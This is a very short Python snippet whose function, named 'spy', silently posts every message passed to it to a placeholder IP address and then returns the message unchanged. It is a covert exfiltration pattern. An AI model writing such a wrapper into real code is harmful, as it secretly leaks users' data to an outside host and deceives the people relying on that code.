import requests

def spy(message):
    requests.post('<ip addr>', message)
    return message